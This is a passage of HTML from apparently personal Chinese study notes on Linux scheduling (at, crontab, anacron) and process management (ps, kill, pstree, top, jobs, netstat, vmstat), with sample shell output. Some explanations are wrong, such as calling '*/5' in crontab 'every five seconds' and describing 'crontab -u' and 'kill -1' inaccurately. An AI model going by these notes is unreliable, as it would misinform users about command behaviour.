&amp;</span><br>    [<span class="hljs-meta">3</span>] <span class="hljs-number">25538</span><br>    [<span class="hljs-meta">root@YH dev</span>]<span class="hljs-meta"># echo &quot;scale=100000; 4*a(1)&quot; | bc -lq &amp;</span><br>    [<span class="hljs-meta">4</span>] <span class="hljs-number">25541</span><br>    [<span class="hljs-meta">root@YH dev</span>]<span class="hljs-meta"># uptime</span><br>     <span class="hljs-number">14</span>:<span class="hljs-number">13</span>:<span class="hljs-number">13</span> up <span class="hljs-number">12</span> days,  <span class="hljs-number">4</span>:<span class="hljs-number">26</span>,  <span class="hljs-number">2</span> users,  load average: <span class="hljs-number">0.87</span>, <span class="hljs-number">0.21</span>, <span class="hljs-number">0.17</span><br>    [<span class="hljs-meta">root@YH dev</span>]<span class="hljs-meta"># batch</span><br>    at&gt; .u^H^H<br>    at&gt; /usr/bin/updatedb<br>    at&gt; &lt;EOT&gt;<br>    job <span class="hljs-number">3</span> at Wed Sep <span class="hljs-number">22</span> <span class="hljs-number">14</span>:<span class="hljs-number">13</span>:<span class="hljs-number">00</span> <span class="hljs-number">2021</span><br>    [<span class="hljs-meta">root@YH dev</span>]<span class="hljs-meta"># date;atq</span><br>    Wed Sep <span class="hljs-number">22</span> <span class="hljs-number">14</span>:<span class="hljs-number">13</span>:<span class="hljs-number">54</span> CST <span class="hljs-number">2021</span><br>    <span class="hljs-number">3</span>Wed Sep <span class="hljs-number">22</span> <span class="hljs-number">14</span>:<span class="hljs-number">13</span>:<span class="hljs-number">00</span> <span class="hljs-number">2021</span> b root<br>    [<span class="hljs-meta">root@YH dev</span>]<span class="hljs-meta"># jobs</span><br>    [<span class="hljs-meta">1</span>]   Running                 echo <span class="hljs-string">&quot;scale=100000; 4*a(1)&quot;</span> | bc -lq &amp;<br>    [<span class="hljs-meta">2</span>]   Running                 echo <span class="hljs-string">&quot;scale=100000; 4*a(1)&quot;</span> | bc -lq &amp;<br>    [<span class="hljs-meta">3</span>]-  Running                 echo <span class="hljs-string">&quot;scale=100000; 4*a(1)&quot;</span> | bc -lq &amp;<br>    [<span class="hljs-meta">4</span>]+  Running                 echo <span class="hljs-string">&quot;scale=100000; 4*a(1)&quot;</span> | bc -lq &amp;<br>    [<span class="hljs-meta">root@YH dev</span>]<span class="hljs-meta"># kill -9 %1 %2 %3 %4</span><br>    [<span class="hljs-meta">root@YH dev</span>]<span class="hljs-meta"># uptime</span><br>     <span class="hljs-number">14</span>:<span class="hljs-number">17</span>:<span class="hljs-number">42</span> up <span class="hljs-number">12</span> days,  <span class="hljs-number">4</span>:<span class="hljs-number">30</span>,  <span class="hljs-number">2</span> users,  load average: <span class="hljs-number">0.36</span>, <span class="hljs-number">1.11</span>, <span class="hljs-number">0.67</span><br>    You have <span class="hljs-keyword">new</span> mail <span class="hljs-keyword">in</span> /<span class="hljs-keyword">var</span>/spool/mail/root<br>    <br></code></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h3 id="循环执行"><a href="#循环执行" class="headerlink" title="循环执行"></a>循环执行</h3><ul><li><p>crontab</p><ul><li><p>首先与at一样也有一个&#x2F;etc&#x2F;cron.allow和&#x2F;etc&#x2F;deny用来限制使用者</p></li><li><p>任务会放到&#x2F;var&#x2F;spool&#x2F;cron中,cron执行的每一项都会记录到&#x2F;var&#x2F;log&#x2F;cron中</p></li><li><p>-u :只有root才能执行这个任务</p></li><li><p>-e :编辑crontab的内容</p></li><li><p>-l :查看crontab的任务内容</p></li><li><p>-r :删除所有的crontab的任务内容,若仅要删除一项使用-e</p></li><li><p>使用-e后vi会给你打开</p></li><li><p>在vi里面加入如下命令即可保存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"> 0  12 *  *  *  mail -s <span class="hljs-string">&quot;at 12:00&quot;</span> dmtsai&lt;/home/dmtsai/.bashrc<br><span class="hljs-comment">#分 时 日 月 年 |--------------------命令--------------------|</span><br><br></code></pre></td></tr></table></figure><p>*  代表任何时间都接受</p><p>,  代表分割时间例如 1,2 * * * *:任何时间的第一个分钟和第二分钟都会执行</p><p>-  代表一段时间内都会执行例如 20 8-12 * * * 代表8点到12点的20分钟都会执行</p><p>&#x2F;n 代表间隔 例如 *&#x2F;5 * * * * 每隔五秒运行一次</p></li><li><p>注意-e只是针对用户如果要执行系统的则编辑&#x2F;etc&#x2F;crontab</p></li><li><p>系统最低检测是每分钟,所以每分钟都会检测&#x2F;etc&#x2F;crontab和&#x2F;var&#x2F;spool&#x2F;cron下的文件</p></li></ul></li></ul><p>设置系统的循环命令</p><blockquote><p>vim &#x2F;etc&#x2F;crontab</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">SHELL=/bin/bash<br>PATH=/sbin:/bin:/usr/sbin:/usr/bin<br>MAILTO=root<br><br><span class="hljs-comment"># For details see man 4 crontabs</span><br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name  command to be executed</span><br></code></pre></td></tr></table></figure><p>MAILTO&#x3D;root</p><p>就代表发生错误就将信息用mail发给root可以改成自己的邮箱例如<a href="mailto:&#x31;&#56;&#x33;&#52;&#x35;&#49;&#x39;&#51;&#x32;&#x39;&#64;&#113;&#113;&#x2e;&#99;&#x6f;&#x6d;">&#x31;&#56;&#x33;&#52;&#x35;&#49;&#x39;&#51;&#x32;&#x39;&#64;&#113;&#113;&#x2e;&#99;&#x6f;&#x6d;</a></p><p>PATH&#x3D;要查找的文件路径(找命令的路径)</p><p>&#x3D;&#x3D;这里的命令与-e不同时间后面接的是身份&#x3D;&#x3D;</p><p>crond服务读取配置的地方有三个:</p><p>&#x2F;etc&#x2F;crontab</p><p>&#x2F;etc&#x2F;cron.d&#x2F;*</p><p>&#x2F;var&#x2F;spool&#x2F;cron</p><p>&#x3D;&#x3D;如果你设置了出错报告并发送邮箱结果DNS出错了,导致又要将DNS报告发送这样一直循环会浪费大量的系统资源,所以最好找一个垃圾桶&#x3D;&#x3D;</p><h3 id="可唤醒的停机期间的任务"><a href="#可唤醒的停机期间的任务" class="headerlink" title="可唤醒的停机期间的任务"></a>可唤醒的停机期间的任务</h3><p>anacron:被cron执行每小时检测一次</p><p>以防止anacron误判时间因此会放在&#x2F;etc&#x2F;cron.hourly里面anacron才会在文件之前加一个0让anacron最先执行以免误判crontab未执行的任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH cron.hourly]<span class="hljs-comment"># cat /etc/anacrontab </span><br><span class="hljs-comment"># /etc/anacrontab: configuration file for anacron</span><br><br><span class="hljs-comment"># See anacron(8) and anacrontab(5) for details.</span><br><br>SHELL=/bin/sh<br>PATH=/sbin:/bin:/usr/sbin:/usr/bin<br>MAILTO=root<br><span class="hljs-comment"># the maximal random delay added to the base delay of the jobs</span><br>RANDOM_DELAY=45<br><span class="hljs-comment"># the jobs will be started during the following hours only</span><br>START_HOURS_RANGE=3-22<br><br><span class="hljs-comment">#period in days   delay in minutes   job-identifier   command</span><br>15cron.daily<span class="hljs-built_in">nice</span> run-parts /etc/cron.daily<br>725cron.weekly<span class="hljs-built_in">nice</span> run-parts /etc/cron.weekly<br>@monthly 45cron.monthly<span class="hljs-built_in">nice</span> run-parts /etc/cron.monthly<br><br></code></pre></td></tr></table></figure><p>查看anacron的配置</p><p>天数|延迟时间|工作名称定义|要执行的命令</p><p>anacron的流程大概为:</p><ol><li>首先由&#x2F;etc&#x2F;anacrontab分析到cron.daily这项任务名称的天数为1天</li><li>从 &#x2F;var&#x2F;spool&#x2F;anacron&#x2F;cron.daily得出最后一次的时间</li><li>若相差一天则执行</li><li>通过&#x2F;etc&#x2F;anacrontab得到将延迟5分+3小时(通过START_HOURS_RANGE设置)</li><li>延迟时间过后运行run-parts &#x2F;etc&#x2F;cron.daily</li><li>执行后结束</li></ol><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><p>Linux的程序一般成为fork-and-exec。进程都会借用fork(复制)的生产方式一个一摸一样的子进程</p><p>&#x3D;&#x3D;一般程序在文件名后面加个d(daemon)代表后台进程&#x3D;&#x3D;例如atd,crond</p><h4 id="PS命令"><a href="#PS命令" class="headerlink" title="PS命令"></a>PS命令</h4><p>查看当前系统正在执行的进程信息</p><p>最常用的两个命令&#x3D;&#x3D;ps -l&#x3D;&#x3D; &#x3D;&#x3D;ps aux&#x3D;&#x3D;</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20210923141832324.png" alt="image-20210923141832324"></p><p>其中:</p><ol><li>F代表权限,4代表root权限,1代表只能复制不能执行</li><li>S代表状态,R代表该进程正在运行,S代表正在睡眠,T代表停止运行,D代表不可唤醒状态,Z代表僵尸状态</li><li>UID&#x2F;PID&#x2F;PPID:<ol><li>此进程被该UID所拥有</li><li>此进程的PID</li><li>此进程的父PID</li></ol></li><li>C代表CPU的使用率</li><li>PRI代表优先级</li><li>ADDR代表内存在哪部分</li><li>SZ代表进程用掉了多少内存</li><li>WCHAN代表是否在运行 - 表示正在运行</li><li>TTY代表登陆这终端</li><li>TIME代表CPU占用时间</li><li>CMD代表真正运行的命令(&#x3D;&#x3D;如果这一栏有&lt;default&gt;则代表该进程为僵尸进程&#x3D;&#x3D;)僵尸进程是因为父进程没有完整的结束该进程</li></ol><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20210923142725115.png" alt="image-20210923142725115"></p><p>用户   PID  CPU占用率  内存占用率  虚拟内存大小  固定内存大小  终端  状态(和上面的意义)  启动时间 CPU占用时间 命令</p><p>参数:</p><ul><li>a  显示所有进程</li><li>-a 显示同一终端下的所有程序</li><li>-A 显示所有进程</li><li>c  显示进程的真实名称</li><li>-N 反向选择</li><li>-e 等于“-A”</li><li>e  显示环境变量</li><li>f  显示程序间的关系</li><li>-H 显示树状结构</li><li>r  显示当前终端的进程</li><li>T  显示当前终端的所有程序</li><li>u  指定用户的所有进程</li><li>-au 显示较详细的资讯</li><li>-aux 显示所有包含其他使用者的行程 </li><li>-C&lt;命令&gt; 列出指定命令的状况</li><li>–lines&lt;行数&gt; 每页显示的行数</li><li>–width&lt;字符数&gt; 每页显示的字符数</li><li>–help 显示帮助信息</li><li>–version 显示版本显示</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH ~]<span class="hljs-comment"># ps -alt</span><br>F   UID   PID  PPID PRI  NI    VSZ   RSS WCHAN  STAT TTY        TIME COMMAND<br>4     0  1113  1106  20   0 116336  2840 do_wai Ss   pts/2      0:00 -bash<br>0  1000  1180  1179  20   0 116204  2720 n_tty_ Ss+  pts/3      0:00 -bash<br>4     0  1270     1  20   0 110208   812 n_tty_ Ss+  tty1       0:00 /sbin/agetty --noclear tty1 linux<br>4     0  1271     1  20   0 110208   824 n_tty_ Ss+  ttyS0      0:00 /sbin/agetty --keep-baud 115200,38400,9600 ttyS0 vt<br>4     0  1324  1113  20   0 153328  1504 -      R+   pts/2      0:00 ps -alt<br>4     0 21527 21524  20   0 116336  2852 n_tty_ Ss+  pts/0      0:00 -bash<br>0  1000 21618 21617  20   0 116204  2740 n_tty_ Ss+  pts/1      0:00 -bash<br><br></code></pre></td></tr></table></figure><p>PID指代当前进程的号，PPID指代父进程的PID</p><blockquote><p>| 在Linux中这个叫管道符号 比如A|B将A命令运行的结果送给B</p><p>grep 查找文件中符合条件的字符串</p></blockquote><p>ps -aux|grep mysql这个命令就可以查看所有有关mysql的进程</p><p>ps -ef可以看父进程（一般不这么用看父目录可以使用pstree）</p><blockquote><p>详细请看这个网站</p><p><a href="https://www.cnblogs.com/xiangtingshen/p/10920236.html">https://www.cnblogs.com/xiangtingshen/p/10920236.html</a></p></blockquote><h4 id="kill命令"><a href="#kill命令" class="headerlink" title="kill命令"></a>kill命令</h4><p>&#x3D;&#x3D;kill命令是用来控制其他进程的不单单只是杀死&#x3D;&#x3D;</p><p>命令参数</p><ul><li>-9 杀死一个进程</li><li>-1 重启一个进程</li><li>-15 正常停止一个进程</li><li>-l &lt;信息编号&gt; 　若不加&lt;信息编号&gt;选项，则 -l 参数会列出全部的信息名称</li><li>后面一般接进程的PID如果想要管理bash任务就要用%+数字</li></ul><p>例如</p><p>强制杀死进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">kill</span> -9 123456<br></code></pre></td></tr></table></figure><p>杀死指定用户所有进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">kill</span> -9 $(ps -ef | grep hnlinux) //方法一 过滤出hnlinux用户进程 <span class="hljs-built_in">kill</span> -u hnlinux //方法二<br></code></pre></td></tr></table></figure><blockquote><p><a href="https://www.runoob.com/linux/linux-comm-kill.html">https://www.runoob.com/linux/linux-comm-kill.html</a></p></blockquote><h4 id="killall"><a href="#killall" class="headerlink" title="killall"></a>killall</h4><p>通过名称对进程下命令</p><ul><li>-i 代表交互式</li><li>-e 代表后面要接的命令完全一致</li><li>-I 忽略大小写</li></ul><h4 id="pstree命令"><a href="#pstree命令" class="headerlink" title="pstree命令"></a>pstree命令</h4><p>Linux pstree命令将所有行程以树状图显示，树状图将会以 pid (如果有指定) 或是以 init 这个基本行程为根 (root)，如果有指定使用者 id，则树状图会只显示该使用者所拥有的行程。</p><blockquote><p><a href="https://www.runoob.com/linux/linux-comm-pstree.html">https://www.runoob.com/linux/linux-comm-pstree.html</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH ~]<span class="hljs-comment"># pstree</span><br>systemd─┬─YDLive───6*[&#123;YDLive&#125;]<br>        ├─YDService───20*[&#123;YDService&#125;]<br>        ├─abrt-dbus───3*[&#123;abrt-dbus&#125;]<br>        ├─acpid<br>        ├─2*[agetty]<br>        ├─atd<br>        ├─auditd───&#123;auditd&#125;<br>        ├─barad_agent─┬─barad_agent<br>        │             └─barad_agent───2*[&#123;barad_agent&#125;]<br>        ├─crond<br>        ├─dbus-daemon<br>        ├─dhclient<br>        ├─iscsid<br>        ├─lsmd<br>        ├─lvmetad<br>        ├─master─┬─pickup<br>        │        └─qmgr<br>        ├─nginx───nginx<br>        ├─ntpd<br>        ├─polkitd───6*[&#123;polkitd&#125;]<br>        ├─rshim───&#123;rshim&#125;<br>        ├─rsyslogd───2*[&#123;rsyslogd&#125;]<br>        ├─sgagent───&#123;sgagent&#125;<br>        ├─sshd───sshd───bash───pstree<br>        ├─systemd-journal<br>        ├─systemd-logind<br>        ├─systemd-udevd<br>        ├─tat_agent───4*[&#123;tat_agent&#125;]<br>        └─tuned───4*[&#123;tuned&#125;]<br><br></code></pre></td></tr></table></figure><p>可以看出所有的进程都是托管子systemd下面</p><h4 id="Linux的多人多任务环境"><a href="#Linux的多人多任务环境" class="headerlink" title="Linux的多人多任务环境"></a>Linux的多人多任务环境</h4><ul><li>多人<ul><li>为啥会多人呢,就是因为每个人登陆后获取的BASH的PID不同</li></ul></li><li>多任务<ul><li>CPU可以进行任务的切换与调度</li></ul></li><li>多重登录的七个终端界面<ul><li>当前Linux提供了六个命令登录界面,以及一个图形界面可以使用ALT+F1-7来切换终端,每个终端的登录者不同</li></ul></li><li>linux不像Windows一样因为某个进程出错而要重启,只需要切换终端杀死即可</li><li>使用&amp;来将进程放到后台例如<ul><li>cp file1 file2 &amp;</li><li>这样进程就会放到后台</li></ul></li></ul><h4 id="top-查看进程的变化-持续查看"><a href="#top-查看进程的变化-持续查看" class="headerlink" title="top:查看进程的变化(持续查看)"></a>top:查看进程的变化(持续查看)</h4><ul><li>-d 秒数:刷新间隔</li><li>-b 以批量的方式执行top</li><li>-n 与-b搭配代表执行几次top结果</li><li>-p 指定某些PID来执行查看检测而已</li><li>是一种类似Windows任务管理器的查看方式进入top后按h可以查看到相关命令</li></ul><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20210923144205956.png" alt="image-20210923144205956"></p><p>基本分为6行</p><ol><li>显示目前时间,经过时间,已经在线人数,系统在1\5\15分钟的平均任务负载</li><li>显示目前进程总数与个别进程的状态还有最后一个zombie代表僵尸进程个数</li><li>显示CPU的负载</li><li>4-5行表示物理内存与虚拟内存的使用情况</li><li>在当前top进程中输入命令显示的地方</li></ol><p>按下M使用内存使用率排序按P(以CPU使用率来排序)恢复按q退出</p><h3 id="进程之间的相互管理"><a href="#进程之间的相互管理" class="headerlink" title="进程之间的相互管理"></a>进程之间的相互管理</h3><p>如果我没想要管理进程其实是使用一个进程来控制另一个进程,而进程之间是用信号来管理的查看信号可以使用</p><p>kill -l(放心杀不了进程)或使用man 7 signal(如果报错就用yum 安装)</p><h3 id="任务管理"><a href="#任务管理" class="headerlink" title="任务管理"></a>任务管理</h3><p>由于&#x2F;etc&#x2F;security&#x2F;limits.conf文件会设置用户的连接数,某些用户只能以一个连接来工作所以出错后不能切换到别的终端进行处理,所以加入了任务管理</p><p>有些进程需要与用户进行交互所以成为前台,而不需要交互的称为后台</p><p>后台程序不能使用ctrl+c来终止</p><p>任务管理的限制:</p><ul><li>这些任务的触发必须来自于你的shell子进程</li><li>前台:可控制与执行命令的环境称为前台</li><li>后台:可以自动执行的任务,可以使用bg,fg来调用</li><li>后台中执行的进程不能等待terminal或shell的输入</li></ul><p>使用&amp;可以将命令在后台运行但是建议加上流控制这样免得报错或者提示信息将控制台弄的乱七八糟.</p><p>如果想要将正在运行的程序放到后台中使用ctrl+z</p><p>列出目前后台的状态jobs</p><ul><li><p>jobs</p><ul><li><p>-l 除了job number与命令串之外,同时列出PID</p></li><li><p>-r 列出正在运行的任务</p></li><li><p>-s 列出stop的程序</p></li><li><p>结果中+代表默认使用的任务使用fg即可得到</p></li><li><p>&#96;&#96;&#96;bash<br>[root@YH YH]# logout<br>There are stopped jobs.<br>[root@YH YH]# jobs<br>[1]+  Stopped                 vim cron.txt<br>[root@YH YH]# fg<br>vim cron.txt</p><p>[1]+  Stopped                 vim cron.txt<br>[root@YH YH]# vim readAgrs.sh </p><p>[2]+  Stopped                 vim readAgrs.sh<br>[root@YH YH]# jobs<br>[1]-  Stopped                 vim cron.txt<br>[2]+  Stopped                 vim readAgrs.sh<br>[root@YH YH]# fg<br>vim readAgrs.sh<br>[root@YH YH]# jobs<br>[1]+  Stopped                 vim cron.txt</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><br>- fg:获取后台服务<br><br>  - fg [%<span class="hljs-keyword">number</span>]<br><br>    - <span class="hljs-keyword">number</span>后台服务的任务号<br><br>    - 可以使用fg -来获取带有-的任务<br><br>    - ```bash<br>      [root@YH YH]<span class="hljs-comment"># jobs</span><br>      [<span class="hljs-number">1</span>]   <span class="hljs-literal">Stopped</span>                 vim cron.txt<br>      [<span class="hljs-number">2</span>]-  <span class="hljs-literal">Stopped</span>                 vim fstab<br>      [<span class="hljs-number">3</span>]   <span class="hljs-literal">Stopped</span>                 vim installPath.txt<br>      [<span class="hljs-number">4</span>]+  <span class="hljs-literal">Stopped</span>                 vim diff_fstab<br>      [root@YH YH]<span class="hljs-comment"># fg -</span><br>      这样就直接获取任务<span class="hljs-number">2</span>了<br></code></pre></td></tr></table></figure><ul><li>什么都不加获取带有+的任务</li></ul></li></ul></li><li><p>bg:让后台任务运行</p><ul><li>bg %number</li></ul></li></ul><h3 id="脱机管理"><a href="#脱机管理" class="headerlink" title="脱机管理"></a>脱机管理</h3><p>由于任务管理在用户退出Linux后任务也会自动终端所以可以使用nohup来处理这个命令.(也可以使用at 命令)</p><p>但是nohup不支持bash的内置命令</p><p>nohup这本书介绍的不多自己查吧</p><h4 id="关于CPU的调度顺序"><a href="#关于CPU的调度顺序" class="headerlink" title="关于CPU的调度顺序"></a>关于CPU的调度顺序</h4><p>Priority:PRI,值越低优先级越高.用户无法调整</p><p>Nice:NI PRI(new) &#x3D; PRI(old)+NI,虽然我们可以手动调整NI但并不一定会按照理想的调整</p><p>例如:PRI &#x3D; 50 我们调整NI为5 PRI并不一定等于55因为是系统自动调整的</p><p>NI的取值范围(-20~19)</p><ul><li>nice 执行新命令并给予一个nice<ul><li>-n 数字</li></ul></li><li>renice 对一个已经执行的命令给予一个NI值</li></ul><h4 id="查看系统资源"><a href="#查看系统资源" class="headerlink" title="查看系统资源"></a>查看系统资源</h4><p>free查看内存使用</p><ul><li>-h最常用会显示单位</li><li>-t输出结果显示物理内存与swap总量</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH ~]<span class="hljs-comment"># free -ht</span><br>              total        used        free      shared  buff/cache   available<br>Mem:           1.8G        226M        1.3G        640K        286M        1.4G<br>Swap:            0B          0B          0B<br>Total:         1.8G        226M        1.3G<br></code></pre></td></tr></table></figure><p>有时候我们会遇到woc,buff&#x2F;cache为啥把所有的内存都站了….没事因为正是因为你系统没啥东西可能导致的,再就是经常读写文件修改配置等导致的,如果你要用系统会自动调控的.</p><p>看到available了嘛那个才是真正能用的内存数量</p><h4 id="uname查看内核信息"><a href="#uname查看内核信息" class="headerlink" title="uname查看内核信息"></a>uname查看内核信息</h4><p>-a查看所有</p><h4 id="uptime查看系统启动时间与任务负载"><a href="#uptime查看系统启动时间与任务负载" class="headerlink" title="uptime查看系统启动时间与任务负载"></a>uptime查看系统启动时间与任务负载</h4><h4 id="netstat网络追踪与socket文件"><a href="#netstat网络追踪与socket文件" class="headerlink" title="netstat网络追踪与socket文件"></a>netstat网络追踪与socket文件</h4><ul><li>-a 所有</li><li>-u udp的</li><li>-t tcp的</li><li>-n 以端口列出服务名</li><li>-l 列出正在监听的服务</li><li>-p 列出网络进程的PID</li></ul><p>显示数据分为两部分</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH ~]<span class="hljs-comment"># netstat -a</span><br>Active Internet connections (servers and established)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State      <br>tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN     <br>tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     <br>tcp        0      0 VM-0-5-centos:smtp      0.0.0.0:*               LISTEN     <br>tcp        0      0 YH:58988                169.254.0.138:d-s-n     ESTABLISHED<br>tcp        0      0 YH:ssh                  153.118.35.43:22177     ESTABLISHED<br>tcp        0      0 YH:ssh                  153.118.35.43:21795     ESTABLISHED<br>tcp        0      0 YH:55572                169.254.0.55:webcache   TIME_WAIT  <br>tcp        0     52 YH:ssh                  153.118.35.43:21834     ESTABLISHED<br>tcp        0      0 YH:ssh                  153.118.35.43:21817     ESTABLISHED<br>tcp        0      0 YH:42208                169.254.0.55:lsi-bobcat ESTABLISHED<br>tcp        0      0 YH:ssh                  153.118.35.43:21899     ESTABLISHED<br>tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     <br>tcp6       0      0 VM-0-5-centos:smtp      [::]:*                  LISTEN     <br>udp        0      0 0.0.0.0:bootpc          0.0.0.0:*                          <br>udp        0      0 YH:ntp                  0.0.0.0:*                          <br>udp        0      0 VM-0-5-centos:ntp       0.0.0.0:*                          <br>udp6       0      0 VM-0-5-centos:ntp       [::]:*                             <br>udp6       0      0 YH:ntp                  [::]:*   <br></code></pre></td></tr></table></figure><ul><li>proto:协议</li><li>Recv-Q:非由用户进程连接的Bytes总数</li><li>Send-Q:非由远程用户传送过来的Bytes总数</li><li>Local: Address本地连接地址</li><li>Foreign: Address远程连接地址</li><li>State: 状态ESTABLISHED为建立LISTEN为监听</li></ul><p>另一部分sockets文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">Active UNIX domain sockets (servers and established)<br>Proto RefCnt Flags       Type       State         I-Node   Path<br>unix  2      [ ACC ]     STREAM     LISTENING     13829    /var/run/lsm/ipc/sim<br>unix  2      [ ACC ]     STREAM     LISTENING     17652    public/pickup<br>unix  2      [ ACC ]     STREAM     LISTENING     17656    public/cleanup<br>unix  2      [ ACC ]     STREAM     LISTENING     17659    public/qmgr<br>unix  2      [ ACC ]     STREAM     LISTENING     17663    private/tlsmgr<br>unix  2      [ ACC ]     STREAM     LISTENING     17666    private/rewrite<br>unix  2      [ ACC ]     STREAM     LISTENING     13003    @ISCSID_UIP_ABSTRACT_NAMESPACE<br>unix  2      [ ACC ]     STREAM     LISTENING     17669    private/bounce<br></code></pre></td></tr></table></figure><ul><li>proto:一般为unix</li><li>RefCnf:连接到此socket的进程数量</li><li>Flags:连接的标识</li><li>Type:socket取值类型,stream(需要确认)和dgram(不需要确认)</li><li>state:若为connected代表多个进程之间已经建立连接</li><li>path:连接到此socket的相关进程路径</li></ul><blockquote><p>列出所有开放的端口命令</p><p>netstat -tulnp</p></blockquote><h4 id="dmesg分析内核产生信息"><a href="#dmesg分析内核产生信息" class="headerlink" title="dmesg分析内核产生信息"></a>dmesg分析内核产生信息</h4><p>建议管道过滤以下</p><h4 id="vmstat检测系统资源变化"><a href="#vmstat检测系统资源变化" class="headerlink" title="vmstat检测系统资源变化"></a>vmstat检测系统资源变化</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH ~]<span class="hljs-comment"># vmstat -a</span><br>procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----<br> r  b   swpd   free  inact active   si   so    bi    bo   <span class="hljs-keyword">in</span>   cs us sy <span class="hljs-built_in">id</span> wa st<br> 4  0      0 1341564  85916 237060    0    0     1    32   21   32  1  1 99  0  0<br> --进程字段<br><span class="hljs-comment"># r等待运行的进程数量</span><br><span 